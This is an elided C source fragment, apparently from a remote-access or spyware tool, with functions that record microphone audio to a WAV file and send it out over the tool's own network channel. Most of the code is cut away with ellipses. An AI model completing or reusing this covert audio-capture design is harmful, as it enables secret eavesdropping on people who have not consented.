...
int SendSoundRecord(char * szWavName)
{
	...
	{
		iRet = IndependentNetWork_SendMessage(lpBuf,dwFileSize,SOUNDRECORD,szWavName);
	}
...
int CreateWaveFile()
{
	...
	int iRet = ModifyModuleFileName(strFilePath,strFileName);
...
int __stdcall SoundRecord(unsigned long DelayTime)
{
	...
	try
	{
		...
		{
			WriteLittleBearLog("SoundRecord lpCreateThread error\r\n");
		...
		if(!CreateWaveFile())
		{
			WriteLittleBearLog("SoundRecord CreateWaveFile error\r\n");
			return FALSE;
		}
		...
		{                                        //can be replaced with hard coded buffer allocation
			...
			if(soundIn.buffers[x].lpData == NULL)
			{
				...
				WriteLittleBearLog("SoundRecord buffers error\r\n");
				return FALSE;
			}
			else
			{
		...
		{
			WriteLittleBearLog("SoundRecord lpwaveInOpen error\r\n");
		...
		for(x=0;x<IN_BUFFERS_NUMBER;x++)
		{
			...
			if(errorResult != MMSYSERR_NOERROR)
			{
				...
				WriteLittleBearLog("SoundRecord lpwaveInPrepareHeader error\r\n");
				return FALSE;
			}
			...
			if(errorResult != MMSYSERR_NOERROR )
			{
				...
				if(soundIn.buffers_left < 2)
				{
					...
					WriteLittleBearLog("SoundRecord lpwaveInAddBuffer error\r\n");
					return FALSE;
				}
			}
		}
	...
	{
		WriteLittleBearLog("SoundRecord exception\r\n");
		return FALSE;
	}
}
